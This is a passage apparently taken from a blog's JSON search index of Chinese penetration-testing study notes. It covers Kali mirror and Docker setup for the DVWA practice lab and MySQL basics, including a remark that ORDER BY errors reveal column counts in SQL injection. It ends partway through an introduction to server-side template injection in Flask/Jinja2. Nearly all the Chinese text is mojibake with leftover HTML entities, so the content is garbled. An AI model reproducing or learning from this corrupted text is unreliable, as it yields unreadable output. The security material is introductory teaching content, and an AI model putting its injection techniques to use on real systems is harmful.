kali-rolling/main non-free contrib#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#é‡åº†å¤§å­¦#deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib\n\næ„Ÿè°¢CSDNåšä¸»ã€Œå‘å¾®çš„é‚£èˆã€æ•´ç†çš„2022å¹´å…¨æ–°kaliå›½å†…æº KALIæ›´æ¢å›½å†…æºï¼ˆ2022å¹´å…¨æ–°ï¼‰\nè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ä¸­ç§‘å¤§çš„æº\n\n\nä¹‹åæ›´æ–°aptæºå³å¯ã€‚\nsudo apt-get update\n\nDockerå®‰è£…å’ŒéªŒè¯sudo apt-get install -y docker docker-compose   # å®‰è£…dockerå’Œdocker-composeï¼Œ-yè¡¨ç¤ºé»˜è®¤å…¨éƒ¨yes\n\nå¾…å®‰è£…å®Œæˆåï¼Œå¯ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼Œä»¥éªŒè¯dockeræ˜¯å¦å®‰è£…æˆåŠŸã€‚\ndocker --version # æŸ¥çœ‹ç‰ˆæœ¬docker-compose --version # æŸ¥çœ‹ç‰ˆæœ¬\n\n\n\nå¯åœç®¡ç†sudo systemctl start/stop/restart docker # å¯åŠ¨ã€åœæ­¢ã€é‡å¯docker\n\né€šè¿‡ä»¥ä¸Šå‘½ä»¤å³å¯ä»¥å®ç°Dockerçš„å¯åœã€‚\né…ç½®åŠ é€Ÿå™¨ä½¿ç”¨Dockerçš„æ—¶å€™ï¼Œéœ€è¦ç»å¸¸ä»å®˜æ–¹è·å–é•œåƒï¼Œä½†æ˜¯ç”±äºç½‘ç»œåŸå› ï¼Œæ‹‰å–é•œåƒçš„è¿‡ç¨‹éå¸¸è€—æ—¶ï¼Œä¸¥é‡å½±å“Dockerçš„ä½¿ç”¨ã€‚å› æ­¤å¯ä»¥é€šè¿‡é…ç½®åŠ é€Ÿå™¨æ¥è§£å†³ã€‚\n# æ·»åŠ ä¸€ä¸ªdaemon.jsonsudo vim /etc/docker/daemon.json# å°†ä»¥ä¸‹é•œåƒæ³¨å†Œcopyè¿›daemon.jsonä¸­&#123; &quot;registry-mirrors&quot;: [    &quot;https://dockerhub.azk8s.cn&quot;,    &quot;https://reg-mirror.qiniu.com&quot;,    &quot;https://1rqfztnd.mirror.aliyuncs.com&quot;  ]&#125;\n\nå†™å…¥daemon.jsonæ–‡ä»¶åï¼Œä¸‹é¢ä½¿åŠ é€Ÿå™¨ç”Ÿæ•ˆã€‚\nsudo systemctl daemon-reload  # é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶sudo systemctl restart docker # é‡å¯docker\n\nDockerå®‰è£…ã€è¿è¡ŒDVWAé¶åœºsudo docker search dvwa # æœç´¢DVWAsudo docker pull citizenstig/dvwa # æ‹‰å–å®‰è£…æŒ‡å®šdvwasudo docker run --rm --name dvwa -it -p 8888:80 citizenstig/dvwa  # dockerè¿è¡Œdvwanetstat -ntulp | grep 8888  # æŸ¥çœ‹å®¹å™¨æŒ‡å®šç«¯å£æ˜¯å¦è¢«æ‰“å¼€è®¿é—® http://localhost:8888 è¿›è¡Œdvwaçš„è®¿é—®\n\n\næ³¨ï¼šå®¹å™¨åœ¨è¿è¡Œæ—¶ä¼šç”Ÿæˆä¸€ä¸ªé•œåƒï¼Œé•œåƒåœ¨ç”Ÿæˆåä¼šå¤„äºå‡ ç§çŠ¶æ€ï¼šè¿è¡Œä¸­å’Œå·²åœæ­¢ï¼Œ--rmå‘½ä»¤ä½¿é•œåƒåœ¨åœæ­¢ä¹‹åè‡ªåŠ¨åˆ é™¤ã€‚éœ€è¦ä¿ç•™é•œåƒæ—¶å°±å¯ä»¥ä¸åŠ è¯¥å‚æ•°ï¼›--name dvwaä¸ºé•œåƒèµ·åä¸ºdvwaï¼›-på¯ç†è§£ä¸ºç«¯å£çš„æ˜ å°„ï¼Œå³æŠŠå¤–éƒ¨çš„8888ç«¯å£æ˜ å°„é•œåƒçš„80ç«¯å£ï¼Œé€šè¿‡è®¿é—®å¤–éƒ¨8888ç«¯å£ï¼Œå³å¯è®¿é—®åˆ°80ç«¯å£ã€‚\n\n\n\n","categories":["æ¸—é€ï¼šä»0åˆ°1"],"tags":["web","æ¸—é€"]},{"title":"æ•°æ®åº“åŸºç¡€","url":"/2022/12/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/","content":"æ•°æ®åº“(database)å°±æ˜¯ä¸€ä¸ªç”±ä¸€æ‰¹æ•°æ®æ„æˆçš„æœ‰åºé›†åˆï¼Œè¿™ä¸ªé›†åˆé€šå¸¸è¢«ä¿å­˜ä¸ºä¸€ä¸ªæˆ–å¤šä¸ªå½¼æ­¤ç›¸å…³çš„æ–‡ä»¶ã€‚é€šä¿—çš„è®²ï¼Œæ•°æ®åº“å°±æ˜¯è½¯ä»¶å­˜æ”¾æ•°æ®çš„ä¸€ä¸ªç©ºé—´ï¼Œè€Œæ•°æ®ä¸­æœ‰å¾ˆå¤šéƒ½æ˜¯æœ‰å…³è”çš„ã€‚ç”¨æˆ·å¯ä»¥å¯¹æ–‡ä»¶çš„æ•°æ®è¿›è¡Œæ–°å¢ã€æˆªå–ã€æ›´æ–°ã€åˆ é™¤ç­‰æ“ä½œã€‚\n\næ•°æ®åº“æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ(DBMS)æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMS, åé¢ç®€ç§°æ•°æ®åº“ï¼‰æ˜¯ä¸€ç§æ“çºµå’Œç®¡ç†æ•°æ®åº“çš„è½¯ä»¶ï¼Œç”¨äºå»ºç«‹ã€ä½¿ç”¨å’Œç»´æŠ¤æ•°æ®åº“ã€‚å®ƒå¯¹æ•°æ®åº“è¿›è¡Œç»Ÿä¸€çš„ç®¡ç†å’Œæ§åˆ¶ï¼Œä»¥ä¿è¯æ•°æ®åº“çš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ã€‚\næ•°æ®åº“ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼šå…³ç³»å‹æ•°æ®åº“å’Œéå…³ç³»å‹æ•°æ®åº“\nå…³ç³»å‹æ•°æ®åº“ï¼šå­˜å‚¨æ ¼å¼èƒ½ç›´è§‚åæ˜ å®ä½“é—´çš„å…³ç³»ï¼Œå’Œåˆ›å»ºçš„è¡¨æ ¼æ¯”è¾ƒç›¸ä¼¼ï¼Œè¡¨ä¸è¡¨ä¹‹é—´æœ‰ç€å¤æ‚çš„å…³è”å…³ç³»ã€‚æœ‰MySQL, Oracle, Microsoft SQL Server, Accessç­‰ã€‚\n\nä¸¾ä¸ªä¾‹å­ï¼Œé€šè¿‡Stuuupidè¿™ä¸ªç”¨æˆ·ï¼Œå¯ä»¥å°†ä»–çš„â€œä¸ªäººä¿¡æ¯â€â€œåšå®¢ä¿¡æ¯â€â€œè”ç³»æ–¹å¼â€è¿™ä¸‰å¼ è¡¨çš„æ•°æ®å…³è”èµ·æ¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠè¿™ä¸ªç”¨æˆ·Stuuupidè¿™ä¸ªç”¨æˆ·ä½œä¸ºå…³é”®ç‚¹ï¼ŒæŠŠä¸Šè¿°å…¶ä»–ä¸‰å¼ è¡¨çš„æ•°æ®ä¸€èµ·æŸ¥å‡ºæ¥ã€‚è¿™å°±æ˜¯å…³ç³»å‹æ•°æ®åº“ã€‚\n\néå…³ç³»å‹æ•°æ®åº“ï¼šåˆ†å¸ƒå¼ã€éå…³ç³»å‹çš„ã€ä¸ä¿è¯éµå¾ªACIDåŸåˆ™çš„æ•°æ®å­˜å‚¨ç³»ç»Ÿã€‚æœ‰MongoDB, Redis, HBaseç­‰ã€‚\nSQLåŸºç¡€SQL(Structured Query Language) , ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼Œè¿™ç§è¯­è¨€å·²å‘å±•ä¸ºäººä»¬åœ¨æ„é€ æ•°æ®åº“æŸ¥è¯¢å‘½ä»¤çš„ä¸€ä¸ªæ ‡å‡†ã€‚\næŸ¥è¯¢æ˜¯äººä»¬ç”¨å„ç§SQLæŒ‡ä»¤æ„é€ å‡ºæ¥çš„ï¼ŒSQLæŒ‡ä»¤è´Ÿè´£å…·ä½“å®Œæˆç­›é€‰å’Œæå–ç»“æœæ•°æ®çš„å·¥ä½œã€‚åŸºæœ¬çš„æŒ‡ä»¤å¦‚å¢ã€åˆ ã€æ”¹ã€æŸ¥ç­‰ã€‚\nMySQLåŸºç¡€æ•°æ®åº“ç»“æ„\n\næ•°æ®åº“ä¸­çš„æ•°æ®æ˜¯å­˜å‚¨åœ¨æ•°æ®åº“è¡¨ä¸­ï¼Œå¦‚ä¸Šå›¾ä¸ºæ•°æ®åº“çš„åŸºæœ¬è¡¨ç»“æ„ï¼ˆç±»ä¼¼Excelè¡¨æ ¼ï¼‰ï¼Œæ¯ä¸€ä¸ªä¸åŒçš„è¡¨æ±‡æ€»èµ·æ¥å°±æ„æˆä¸€ä¸ªæ•°æ®åº“ã€‚\næ•°æ®ç±»å‹MySQLä¸­å®šä¹‰æ•°æ®å­—æ®µçš„ç±»å‹å¯¹æ•°æ®åº“çš„ä¼˜åŒ–æ˜¯éå¸¸é‡è¦çš„ã€‚\nMySQLæ”¯æŒå¤šç§æ•°æ®ç±»å‹ï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼šæ•°å€¼ã€æ—¥æœŸ&#x2F;æ—¶é—´å’Œå­—ç¬¦(ä¸²)ç±»å‹ã€‚\næ•°å€¼ç±»å‹åŒ…æ‹¬å°æ•´æ•°å€¼ã€å¤§æ•´æ•°å€¼(INT) ã€æå¤§æ•´æ•°å€¼ã€å•ç²¾åº¦æµ®ç‚¹æ•°å€¼(FLOAT) ã€åŒç²¾åº¦æµ®ç‚¹æ•°å€¼(DOUBLE) ã€å°æ•°å€¼ç­‰ã€‚\n\næ—¥æœŸ&#x2F;æ—¶é—´ç±»å‹\n\n\nç±»å‹\nå¤§å°(bytes)\nèŒƒå›´\næ ¼å¼\nç”¨é€”\n\n\n\nDATE\n3\n1000-01-01&#x2F;9999-12-31\nYYYY-MM-DD\næ—¥æœŸå€¼\n\n\nTIME\n3\nâ€˜-838:59:59â€™&#x2F;â€˜838:59:59â€™\nHH:MM:SS\næ—¶é—´å€¼æˆ–æŒç»­æ—¶é—´\n\n\nYEAR\n1\n1901&#x2F;2155\nYYYY\nå¹´ä»½å€¼\n\n\nDATETIME\n8\n1000-01-01 00:00:00&#x2F;9999-12-31 23:59:59\nYYYY-MM-DD HH:MM:SS\næ··åˆæ—¥æœŸå’Œæ—¶é—´å€¼\n\n\nTIMESTAMP\n4\n1970-01-01 00:00:00&#x2F;2038ç»“æŸæ—¶é—´æ˜¯ç¬¬ 2147483647 ç§’ï¼ŒåŒ—äº¬æ—¶é—´ 2038-1-19 11:14:07ï¼Œæ ¼æ—å°¼æ²»æ—¶é—´ 2038å¹´1æœˆ19æ—¥ å‡Œæ™¨03:14:07\nYYYYMMDD HHMMSS\næ··åˆæ—¥æœŸå’Œæ—¶é—´å€¼ï¼Œæ—¶é—´æˆ³\n\n\nå­—ç¬¦(ä¸²)ç±»å‹\nå°¤å…¶éœ€è¦è®°ä½çš„æ˜¯å®šé•¿å­—ç¬¦ä¸²(CHAR)å’Œå˜é•¿å­—ç¬¦ä¸²(VARCHAR)\nMySQLçº¦æŸç±»å‹çº¦æŸï¼Œå¯¹è¡¨ä¸­çš„æ•°æ®è¿›è¡Œé™å®šï¼Œä¿è¯æ•°æ®çš„æ­£ç¡®æ€§ã€æœ‰æ•ˆæ€§ã€å®Œæ•´æ€§ã€‚\n\n1 ä¸»é”®çº¦æŸ(primary key)ï¼šä¿è¯è¯¥å­—æ®µå…·æœ‰éç©ºä¸”å”¯ä¸€æ€§ï¼Œä¸€å¼ è¡¨ä¸­åªèƒ½æœ‰ä¸€ä¸ªä¸»é”®ï¼Œä¸»é”®æ˜¯è¡¨ä¸­å­—æ®µçš„å”¯ä¸€æ ‡è¯†ã€‚\n\nä¸»é”®çº¦æŸ æ˜¯ä½¿ç”¨æœ€é¢‘ç¹çš„çº¦æŸã€‚åœ¨è®¾è®¡æ•°æ®è¡¨æ—¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéƒ½ä¼šè¦æ±‚è¡¨ä¸­è®¾ç½®ä¸€ä¸ªä¸»é”®ã€‚ä¸»é”®æ˜¯è¡¨çš„ä¸€ä¸ªç‰¹æ®Šå­—æ®µï¼Œè¯¥å­—æ®µèƒ½å”¯ä¸€æ ‡è¯†è¯¥è¡¨ä¸­çš„æ¯æ¡ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå­¦ç”Ÿä¿¡æ¯è¡¨ä¸­çš„å­¦å·æ˜¯å”¯ä¸€çš„ã€‚\nå•ä¸€ä¸»é”®ä½¿ç”¨ä¸€ä¸ªåˆ—ä½œä¸ºä¸»é”®åˆ—ï¼Œå½“è¯¥åˆ—çš„å€¼æœ‰é‡å¤æ—¶ï¼Œåˆ™è¿åå”¯ä¸€çº¦æŸã€‚\nè”åˆä¸»é”®ä½¿ç”¨å¤šä¸ªåˆ—ä½œä¸ºä¸»é”®åˆ—ï¼Œå½“å¤šä¸ªåˆ—çš„å€¼éƒ½å®Œå…¨ç›¸åŒæ—¶ï¼Œåˆ™è¿åå”¯ä¸€çº¦æŸã€‚\nä¸»é”®è‡ªå¢é•¿MySQL ä¸­çš„è‡ªåŠ¨å¢é•¿ç±»å‹è¦æ±‚ï¼š1.ä¸€ä¸ªè¡¨ä¸­åªèƒ½æœ‰ä¸€ä¸ªåˆ—ä¸ºè‡ªåŠ¨å¢é•¿ã€‚2.è‡ªåŠ¨å¢é•¿çš„åˆ—çš„ç±»å‹å¿…é¡»æ˜¯æ•´æ•°ç±»å‹ã€‚3.è‡ªåŠ¨å¢é•¿åªèƒ½æ·»åŠ åˆ°å…·å¤‡ä¸»é”®çº¦æŸä¸å”¯ä¸€æ€§çº¦æŸçš„åˆ—ä¸Šã€‚4.åˆ é™¤ä¸»é”®çº¦æŸæˆ–å”¯ä¸€æ€§çº¦æŸï¼Œå¦‚æœè¯¥åˆ—æ‹¥æœ‰è‡ªåŠ¨å¢é•¿èƒ½åŠ›ï¼Œåˆ™éœ€è¦å…ˆå»æ‰è‡ªåŠ¨å¢é•¿ç„¶ååœ¨åˆ é™¤çº¦æŸã€‚\nalter table &lt;table_name&gt; add primary key(&lt;åˆ—å­—æ®µå&gt;)alter table &lt;table_name&gt; drop primary key\n\n\n\n2 éç©ºçº¦æŸ(not null)ï¼šä¿è¯å­—æ®µä¸èƒ½ä¸ºç©º\n\nalter table &lt;table_name&gt; change column &lt;å­—æ®µå&gt; &lt;æ•°æ®ç±»å‹&gt; not NULL\n\n\n3 å”¯ä¸€çº¦æŸ(unique)ï¼šä¿è¯è¯¥å­—æ®µå…·æœ‰å”¯ä¸€æ€§ä½†å¯ä»¥æ˜¯null\n\nalter table &lt;table_name&gt; add constraint &lt;çº¦æŸå&gt; unique(&lt;åˆ—å&gt;)alter table &lt;table_name&gt; drop key &lt;çº¦æŸå&gt;\n\n\n\n4 å¤–é”®çº¦æŸ(foreign key)ï¼šåœ¨ä¸€ä¸ªè¡¨ä¸­å­˜åœ¨çš„å¦ä¸€ä¸ªè¡¨çš„ä¸»é”®æˆ–å”¯ä¸€é”®\n\nå¤–é”®çº¦æŸç»å¸¸å’Œä¸»é”®çº¦æŸä¸€èµ·ä½¿ç”¨ï¼Œç”¨æ¥ç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§ã€‚\nalter table &lt;table_name&gt; add constraint &lt;å¤–é”®å&gt; foreign key(&lt;åˆ—å&gt;) references &lt;å‚ç…§çš„è¡¨å&gt;(&lt;å‚ç…§çš„åˆ—å&gt;)alter table &lt;table_name&gt; drop foreign key &lt;å¤–é”®å&gt;\n\n\n5 é»˜è®¤çº¦æŸ(default+é»˜è®¤å€¼)ï¼šç”¨äºä¿è¯è¯¥å­—æ®µæœ‰é»˜è®¤å€¼(ç”¨å¼•å·å¼•èµ·æ¥)\n\nALTER TABLE &lt;æ•°æ®è¡¨å&gt;CHANGE COLUMN &lt;å­—æ®µå&gt; &lt;æ•°æ®ç±»å‹&gt; DEFAULT &lt;é»˜è®¤å€¼&gt;\n\nè¯¦ç»†å­¦ä¹ å¯ä»¥å»å…¶ä»–ç½‘ç«™å¯»æ‰¾æ•™ç¨‹ã€‚\nå¸¸è§çš„MySQLè¯­å¥\nè¿æ¥åˆ°æ•°æ®åº“mysql -uroot -p\n\n-uååŠ ç”¨æˆ·åï¼Œ-pè¡¨ç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œenterè¾“å…¥å¯†ç å³å¯æˆåŠŸè¿æ¥åˆ°MySQLã€‚\n\næŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“\nshow databases; // æ³¨æ„åŠ åˆ†å·;è¡¨ç¤ºè¯¥å¥ç»“æŸ\n\nåˆ›å»ºæ•°æ®åº“\ncreate database &lt;åº“å&gt;;\n\nåˆ é™¤æ•°æ®åº“\ndrop database &lt;åº“å&gt;;\n\næŸ¥çœ‹å½“å‰æ•°æ®åº“çš„è¡¨\nuse &lt;åº“å&gt;  // æŒ‡å®šæ•°æ®åº“show tables;\n\næŸ¥çœ‹æŸä¸ªè¡¨çš„å­—æ®µæè¿°\ndesc &lt;è¡¨å&gt;;\n\nå¢ã€åˆ ã€æ”¹ã€æŸ¥\nå¢// æ’å…¥æ•°æ®insert into &lt;è¡¨å&gt;(&lt;å­—æ®µ1&gt;, &lt;å­—æ®µ2&gt;...) values(&lt;å€¼1&gt;,&lt;å€¼2&gt;...);// æ’å…¥å¤šæ¡æ•°æ®insert into &lt;è¡¨å&gt;(&lt;å­—æ®µ1&gt;, &lt;å­—æ®µ2&gt;...) values(&lt;å€¼01&gt;,&lt;å€¼02&gt;...),(&lt;å€¼11&gt;,&lt;å€¼12&gt;...);\næ”¹update &lt;è¡¨å&gt; set &lt;å­—æ®µå&gt;=&lt;ä¿®æ”¹å€¼&gt; where &lt;æ¡ä»¶&gt;;update &lt;è¡¨å&gt; set &lt;å­—æ®µå&gt;=&lt;ä¿®æ”¹å€¼&gt; where &lt;å­—æ®µå&gt;=&lt;å€¼&gt;;// ä¾‹:å°†å­—æ®µid=460061çš„é‚£æ¡æ•°æ®çš„å­—æ®µnameçš„å€¼ä¿®æ”¹ä¸º&#x27;Alen&#x27;// update students set name=&#x27;Alen&#x27; where id = 460061;\n\nè¿™é‡Œç›¸å½“äºç”¨ where æ¥ç´¢å¼•è¦å»ä¿®æ”¹çš„åœ°æ–¹ï¼Œwhere åé¢ä¸ºæ¡ä»¶ã€‚\n\n\n\nåˆ æ•°æ®åº“ä¸­çš„åˆ é™¤ï¼šdelete è¡¨ç¤ºåˆ é™¤ä¸€æ¡æ•°æ®ã€‚æŒ‡å®šç‰©ç†åˆ é™¤ï¼Œå°†æ•°æ®ä»è¡¨ä¸­å½»åº•æŠ¹é™¤ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰é€»è¾‘åˆ é™¤ï¼Œç”¨æˆ·çœ‹èµ·æ¥åˆ æ‰äº†ï¼Œä½†å®é™…ä¸Šè¯¥æ•°æ®ä»åœ¨å­˜åœ¨äºæ•°æ®åº“ä¸­ï¼Œåªæ˜¯ä¸æ˜¾ç¤ºè€Œå·²ã€‚é€»è¾‘åˆ é™¤é€šå¸¸é€šè¿‡update ä¿®æ”¹æŸä¸ªå­—æ®µçš„å€¼æ¥å®ç°ã€‚\ndelete from &lt;è¡¨å&gt; where &lt;æ¡ä»¶&gt;;\n\næŸ¥\nselect * from &lt;è¡¨å&gt; [where &lt;æ¡ä»¶&gt;];  // whereæ¡ä»¶å¯é€‰ï¼Œè‹¥ä¸åŠ ï¼Œåˆ™æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰æ•°æ®\n\n\né«˜çº§æŸ¥è¯¢\næ’åºselect * from &lt;è¡¨å&gt; order by &lt;å­—æ®µå&gt; [asc];  //é»˜è®¤å‡åºselect * from &lt;è¡¨å&gt; order by &lt;å­—æ®µå&gt; desc;    //é™åº\n\n\n\nå¦å¤–ï¼Œä¹Ÿå¯ä»¥ä¸é€šè¿‡å­—æ®µåæ¥å®ç°order by ï¼Œè€Œæ˜¯é€šè¿‡æ•°å­— è¡¨ç¤ºç¬¬å‡ ä¸ªå­—æ®µï¼ˆç¬¬å‡ åˆ—ï¼‰æ¥å®ç°ã€‚\nselect * from &lt;è¡¨å&gt; order by 1;  //æŒ‰ç¬¬ä¸€åˆ—å‡åº\n\n\nå½“åé¢çš„æ•°å­—å¤§äºæ€»å­—æ®µæ•°æ—¶ï¼Œå°±ä¼šæŠ¥é”™ã€‚å¯åœ¨â€œsqlæ³¨å…¥â€ä¸­åˆ©ç”¨è¿™ä¸€ç‰¹æ€§æ¥åˆ¤æ–­è¡¨çš„å­—æ®µæ•°ã€‚\n\n\n\n\nLIMITé™åˆ¶select * from &lt;è¡¨å&gt; LIMIT [&lt;åç§»é‡&gt;, ]&lt;é™åˆ¶æ¡æ•°&gt;;// ä¾‹:æ£€ç´¢å‰2ä¸ªè®°å½•è¡Œï¼Œåç§»é‡é»˜è®¤ä¸º1// select * from students LIMIT 2;// ä¾‹:æ£€ç´¢è®°å½•è¡Œ2-4// select * from students LIMIT 2,3;  //å¯ä»¥ç†è§£ä¸ºä»ç¬¬äºŒè¡Œå¼€å§‹ï¼Œæ£€ç´¢3ä¸ªè®°å½•è¡Œ\n\næ³¨é‡Šç¬¦MySQLæœ‰ä¸‰ç§æ³¨é‡Šæ–¹å¼:\n1. #2. --+ æˆ– --  //åé¢è¦åŠ ç©ºæ ¼3. /**/\n\nå…¶ä»–æ“ä½œç‰ˆæœ¬ä¿¡æ¯\nselect version();select @@version;\n\nè¿”å›å½“å‰ä½¿ç”¨æ•°æ®åº“çš„ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯ç½‘ç«™é…ç½®æ–‡ä»¶ä¸­è¿æ¥æ•°æ®åº“çš„è´¦å·\nselect user();\n\nè¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å\nselect session_user();\n\nç³»ç»Ÿç”¨æˆ·å\nselect system_user();\n\nMySQLç‰¹æ€§information_schemaMySQL 5.0 ä»¥ä¸Šç‰ˆæœ¬è‡ªå¸¦ information_schemaè¿™ä¸ªæ•°æ®åº“ï¼Œå…¶ä¿å­˜ç€å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚\n\n\nå…³äºè¿™ä¸ªæ•°æ®åº“ï¼Œåç»­ä¼šç»§ç»­å­¦ä¹ è¡¥å……ã€‚\n","categories":["æ¸—é€ï¼šä»0åˆ°1"],"tags":["web","æ¸—é€"]},{"title":"æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥","url":"/2022/12/06/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","content":"ä¸€ã€SSTIç®€ä»‹SSTIï¼Œ å³ Server-Side Template Injectionï¼ŒæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ã€‚\n1ã€SSTIäº§ç”ŸåŸå› åœ¨MVCæ¡†æ¶ä¸­ï¼Œç”¨æˆ·çš„è¾“å…¥é€šè¿‡ View æ¥æ”¶ï¼Œäº¤ç»™ Controller ï¼Œç„¶åç”± Controller è°ƒç”¨ Model æˆ–è€…å…¶ä»–çš„ Controller è¿›è¡Œå¤„ç†ï¼Œæœ€åå†è¿”å›ç»™View ï¼Œè¿™æ ·å°±æœ€ç»ˆæ˜¾ç¤ºåœ¨æˆ‘ä»¬çš„é¢å‰äº†ï¼Œé‚£ä¹ˆè¿™é‡Œçš„ View ä¸­å°±ä¼šå¤§é‡åœ°ç”¨åˆ°ä¸€ç§å«åšæ¨¡æ¿çš„æŠ€æœ¯ã€‚ç»•è¿‡æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸ºwebåº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿›ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ¶æ„æ”»å‡»è€…æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå°±ä¼šå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShellç­‰é—®é¢˜ã€‚\n\nç½‘ç«™æ¨¡æ¿å¼•æ“:æ¨¡æ¿å¼•æ“ï¼ˆè¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“ï¼‰æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºç½‘ç«™çš„æ¨¡æ¿å¼•æ“å°±ä¼šç”Ÿæˆä¸€ä¸ªæ ‡å‡†çš„HTMLæ–‡æ¡£ã€‚æ¨¡æ¿å¼•æ“å¯ä»¥è®©ï¼ˆç½‘ç«™ï¼‰ç¨‹åºå®ç°ç•Œé¢ä¸æ•°æ®åˆ†ç¦»ï¼Œä¸šåŠ¡ä»£ç ä¸é€»è¾‘ä»£ç çš„åˆ†ç¦»ï¼Œè¿™å°±å¤§å¤§æå‡äº†å¼€å‘æ•ˆç‡ï¼Œè‰¯å¥½çš„è®¾è®¡ä¹Ÿä½¿å¾—ä»£ç é‡ç”¨å˜å¾—æ›´åŠ å®¹æ˜“ã€‚\n\n\nç°è¡Œçš„æ¨¡æ¿å¼•æ“æœ‰:PHP çš„     Smarty, Twig, Blade.Java çš„    JSP, FreeMareker, Velocity.Python çš„  Flask(Jinja2), django, tornado\n\nâ€¦â€¦\nç®€å•æ¥è¯´ï¼Œå¯ä»¥ç†è§£ä¸ºåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„HTMLä»£ç ã€‚æ¨¡æ¿å¼•æ“ä¼šä¼šæä¾›ä¸€å¥—ç”ŸæˆHTMLä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œå°†å…¶æ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œæœ€åç”Ÿæˆæ¨¡æ¿+ç”¨æˆ·æ•°æ®çš„å‰ç«¯HTMLé¡µé¢ï¼Œåé¦ˆç»™æµè§ˆå™¨ï¼Œä»è€Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚å½“è¿™é‡Œçš„â€œç”¨æˆ·çš„æ•°æ®â€å…·æœ‰æ¶æ„æ”»å‡»æ€§è€Œåˆä¸è¢«å¤„ç†æ—¶ï¼ŒSSTIå°±å‘ç”Ÿäº†ã€‚\n2ã€SSTIæ£€æµ‹å·¥å…· Tplmap\nå·¥å…·åœ°å€: https://github.com/epinna/tplmapå®‰è£…æ•™ç¨‹: https://www.cnblogs.com/ktsm/p/15691652.htmlä½¿ç”¨æ•™ç¨‹: https://blog.csdn.net/EC_Carrot/article/details/109709767\n\nã€å‚è€ƒèµ„æ–™ï¼š**è¯¦è§£SSTIæ¨¡æ¿æ³¨å…¥**ã€‘\näºŒã€SSTI åˆ©ç”¨\nä»¥Flaskï¼ˆJinja2ï¼‰ä¸ºä¾‹ï¼ˆwindowsï¼‰ï¼Œè¯¥ç‰ˆå—ä»…æ¶‰åŠä¸»æœºä¸Šçš„pythonè¯­æ³•\n\nâ… . åŸºç¡€çŸ¥è¯†1ã€Python å†…å»ºå‡½æ•°å¯åŠ¨ python è§£é‡Šå™¨æ—¶ï¼Œå³ä½¿æ²¡æœ‰åˆ›å»ºä»»ä½•å˜é‡æˆ–å‡½æ•°è¿˜æ˜¯ä¼šæœ‰å¾ˆå¤šå‡½æ•°å¯ä¾›ä½¿ç”¨ï¼Œè¿™äº›å°±æ˜¯ python çš„å†…å»ºå‡½æ•°ã€‚åœ¨ Python äº¤äº’æ¨¡å¼ä¸‹ï¼Œä½¿ç”¨å‘½ä»¤ dir(&#39;builtins&#39;) å³å¯æŸ¥çœ‹å½“å‰ Python ç‰ˆæœ¬çš„ä¸€äº›å†…å»ºå˜é‡ã€å†…å»ºå‡½æ•°ï¼Œå†…å»ºå‡½æ•°å¯ä»¥è°ƒç”¨ä¸€åˆ‡å‡½æ•°ã€‚\n2ã€Python ç±»ç»§æ‰¿Python ä¸­ä¸€åˆ‡çš†ä¸ºå¯¹è±¡ï¼Œå‡ç»§æ‰¿äº object å¯¹è±¡ï¼ŒPython ä¸­çš„ object ç±»ä¸­é›†æˆäº†å¾ˆå¤šçš„åŸºç¡€å‡½æ•°ï¼Œå‡å¦‚éœ€è¦åœ¨ payload ä¸­ä½¿ç”¨æŸä¸ªå‡½æ•°å°±éœ€è¦ç”¨ object 